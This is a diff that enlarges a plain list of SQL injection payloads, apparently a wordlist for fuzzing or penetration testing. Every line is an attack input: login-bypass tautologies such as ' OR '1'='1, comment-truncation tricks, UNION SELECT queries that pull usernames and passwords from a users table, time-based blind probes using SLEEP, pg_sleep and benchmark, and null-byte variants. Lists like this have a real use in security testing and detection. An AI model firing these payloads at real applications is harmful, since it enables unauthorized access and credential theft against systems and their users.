@@ -1,4 +1,42 @@
-admin" OR "1"="1
+' OR '1'='1
+" OR "1"="1
 ' OR 1=1 --
-admin'--
-admin") OR ("1"="1
+" OR 1=1 --
+') OR ('1'='1
+admin' --
+admin" --
+' OR 'a'='a
+" OR "a"="a
+' OR ''='
+" OR ""="
+' OR 1=1#
+" OR 1=1#
+' OR 1=1/*
+" OR 1=1/*
+' OR 'x'='x' --
+" OR "x"="x" --
+' AND 1=1 --
+' AND 1=2 --
+' OR EXISTS(SELECT * FROM users) --
+' UNION SELECT NULL --
+' UNION SELECT 1,2,3 --
+' UNION ALL SELECT NULL,NULL --
+' UNION ALL SELECT username,password FROM users --
+' OR SLEEP(5) --
+' OR pg_sleep(5) --
+' OR benchmark(1000000,md5(1)) --
+admin') OR ('1'='1 --
+admin") OR ("1"="1 --
+' OR 1=1 LIMIT 1 --
+' OR 1=1 OFFSET 0 --
+' OR '1'='1' --
+' OR 1=1; --
+' OR 1=1;#
+' OR 1=1;%00
+' OR '1'='1'%00
+') OR 1=1 --
+") OR 1=1 --
+' OR 1=1 AND 'a'='a
+" OR 1=1 AND "a"="a
+' OR 1=1 AND 1=1 --
+' OR 1=1 AND 1=2 --
